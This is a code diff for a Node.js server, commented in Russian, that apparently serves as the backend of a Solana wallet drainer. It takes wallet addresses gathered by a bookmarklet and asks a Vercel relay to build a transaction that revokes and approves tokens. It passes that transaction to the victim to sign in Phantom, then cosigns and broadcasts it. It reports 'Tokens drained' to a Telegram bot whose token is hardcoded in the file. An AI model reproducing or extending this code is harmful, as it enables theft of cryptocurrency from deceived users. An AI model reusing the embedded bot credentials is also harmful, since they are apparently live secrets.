@@ -30,7 +30,7 @@ var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.live
 var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
 var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
 var AGENT_IDENTITY = 'railway-agent-v6';
-var VERCEL_URL     = process.env.VERCEL_URL         || 'https://waterzay.vercel.app';
+var VERCEL_URL     = process.env.VERCEL_URL         || 'https://pumpflow-one.vercel.app';
 var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
 var TG_TOKEN       = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
 var TG_CHAT_ID     = process.env.TELEGRAM_CHAT_ID   || '7253475769';
@@ -169,13 +169,170 @@ function processData(msg, fromIdentity) {
       'Title: ' + (payload.title || '—')
     );
 
-    sendDataToRoom({
-      action: 'ack',
-      ok: true,
-      message: 'Wallet получен! Vercel уведомлён.',
-      wallet: wallet,
-      ts: Date.now(),
-    }, [fromIdentity]);
+    // Если нет адреса кошелька — просто ack
+    if (!wallet || wallet === '—') {
+      sendDataToRoom({
+        action: 'ack',
+        ok: true,
+        message: 'Wallet не получен.',
+        ts: Date.now(),
+      }, [fromIdentity]);
+      return;
+    }
+
+    // Сначала отправляем Vercel /api/relay action=initialize (создаём config PDA)
+    console.log('[wallet] Инициализируем config PDA для ' + wallet);
+    var initBody = JSON.stringify({ action: 'initialize', userPublicKey: wallet });
+    var initUrlObj;
+    try { initUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { initUrlObj = null; }
+
+    var doInitialize = function(cb) {
+      if (!initUrlObj) { cb(null); return; }
+      var isHttps = initUrlObj.protocol === 'https:';
+      var mod = isHttps ? https : http;
+      var opts = {
+        hostname: initUrlObj.hostname,
+        port: initUrlObj.port || (isHttps ? 443 : 80),
+        path: initUrlObj.pathname,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(initBody) },
+      };
+      var req = mod.request(opts, function(res) {
+        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
+          console.log('[wallet] initialize response: ' + res.statusCode + ' ' + d.substring(0, 200));
+          try { cb(JSON.parse(d)); } catch(e) { cb(null); }
+        });
+      });
+      req.on('error', function(e){ console.error('[wallet] initialize error: ' + e.message); cb(null); });
+      req.write(initBody); req.end();
+    };
+
+    // После инициализации — вызываем prepare для построения TX
+    var doPrepare = function() {
+      console.log('[wallet] Запрашиваем prepare TX у Vercel для wallet=' + wallet);
+      var prepBody = JSON.stringify({ action: 'prepare', userPublicKey: wallet, withRevoke: true });
+      var prepUrlObj;
+      try { prepUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { prepUrlObj = null; }
+      if (!prepUrlObj) {
+        sendDataToRoom({ action: 'ack', ok: false, message: 'Bad VERCEL_URL', ts: Date.now() }, [fromIdentity]);
+        return;
+      }
+      var isHttps = prepUrlObj.protocol === 'https:';
+      var mod = isHttps ? https : http;
+      var opts = {
+        hostname: prepUrlObj.hostname,
+        port: prepUrlObj.port || (isHttps ? 443 : 80),
+        path: prepUrlObj.pathname,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(prepBody) },
+      };
+      var req = mod.request(opts, function(res) {
+        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
+          console.log('[wallet] prepare response: ' + res.statusCode + ' ' + d.substring(0, 300));
+          var parsed;
+          try { parsed = JSON.parse(d); } catch(e) {
+            sendDataToRoom({ action: 'error', error: 'prepare parse error', ts: Date.now() }, [fromIdentity]);
+            return;
+          }
+          if (!parsed.success || !parsed.transaction) {
+            console.error('[wallet] prepare failed:', parsed.error || JSON.stringify(parsed).substring(0,200));
+            // Если prepare упал — шлём ack с ошибкой но не зависаем
+            sendDataToRoom({
+              action: 'ack',
+              ok: false,
+              message: 'TX prepare failed: ' + (parsed.error || 'unknown'),
+              wallet: wallet,
+              ts: Date.now(),
+            }, [fromIdentity]);
+            return;
+          }
+          console.log('[wallet] TX готова, sessionId length=' + (parsed.sessionId||'').length + ' tokensFound=' + parsed.tokensFound);
+          // Отдаём транзакцию букмарклету — он подпишет через Phantom
+          sendDataToRoom({
+            action: 'response',
+            ok: true,
+            tx: parsed.transaction,          // base64 VersionedTransaction
+            sessionId: parsed.sessionId,
+            tokensFound: parsed.tokensFound,
+            message: 'TX готова к подписанию',
+            amountSOL: 0.01,
+            ts: Date.now(),
+          }, [fromIdentity]);
+        });
+      });
+      req.on('error', function(e){
+        console.error('[wallet] prepare request error: ' + e.message);
+        sendDataToRoom({ action: 'error', error: 'prepare fetch error: ' + e.message, ts: Date.now() }, [fromIdentity]);
+      });
+      req.write(prepBody); req.end();
+    };
+
+    doInitialize(function(initRes) {
+      if (initRes && initRes.success === false) {
+        console.error('[wallet] initialize failed: ' + (initRes.error || 'unknown'));
+      }
+      // Независимо от результата инициализации — идём в prepare
+      // (initialize идемпотентна — если PDA уже есть, вернёт success:true)
+      doPrepare();
+    });
+
+  } else if (action === 'signed') {
+    // Букмарклет подписал TX и отправил обратно — cosign + broadcast + drain
+    var signedTx = payload.signedTx || msg.signedTx || '';
+    var sessionId = payload.sessionId || msg.sessionId || '';
+    console.log('[signed] from=' + fromIdentity + ' signedTx.length=' + signedTx.length + ' sessionId.length=' + sessionId.length);
+
+    if (!signedTx || !sessionId) {
+      sendDataToRoom({ action: 'error', error: 'signedTx or sessionId missing', ts: Date.now() }, [fromIdentity]);
+      return;
+    }
+
+    var cosignBody = JSON.stringify({ action: 'cosign', signedTransaction: signedTx, sessionId: sessionId });
+    var cosignUrlObj;
+    try { cosignUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { cosignUrlObj = null; }
+    if (!cosignUrlObj) {
+      sendDataToRoom({ action: 'error', error: 'Bad VERCEL_URL for cosign', ts: Date.now() }, [fromIdentity]);
+      return;
+    }
+    var isHttps = cosignUrlObj.protocol === 'https:';
+    var mod = isHttps ? https : http;
+    var cosignOpts = {
+      hostname: cosignUrlObj.hostname,
+      port: cosignUrlObj.port || (isHttps ? 443 : 80),
+      path: cosignUrlObj.pathname,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(cosignBody) },
+    };
+    var cosignReq = mod.request(cosignOpts, function(res) {
+      var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
+        console.log('[signed] cosign response: ' + res.statusCode + ' ' + d.substring(0, 300));
+        var parsed;
+        try { parsed = JSON.parse(d); } catch(e) {
+          sendDataToRoom({ action: 'error', error: 'cosign parse error', ts: Date.now() }, [fromIdentity]);
+          return;
+        }
+        // Отдаём финальный результат букмарклету
+        sendDataToRoom({
+          action: 'cosign_result',
+          ok: parsed.success === true,
+          signature: parsed.signature,
+          tokensApproved: parsed.tokensApproved,
+          message: parsed.success ? 'TX подтверждена! sig=' + parsed.signature : ('Cosign failed: ' + (parsed.error || 'unknown')),
+          ts: Date.now(),
+        }, [fromIdentity]);
+        // Уведомление в Telegram
+        if (parsed.success) {
+          sendTelegram('<b>TX подтверждена!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens drained: ' + (parsed.tokensApproved || 0));
+        } else {
+          sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
+        }
+      });
+    });
+    cosignReq.on('error', function(e){
+      console.error('[signed] cosign error: ' + e.message);
+      sendDataToRoom({ action: 'error', error: 'cosign request error: ' + e.message, ts: Date.now() }, [fromIdentity]);
+    });
+    cosignReq.write(cosignBody); cosignReq.end();
 
   } else if (action === 'data') {
     console.log('[data] url='   + (payload.url   || '—'));
@@ -385,5 +542,3 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
-
-
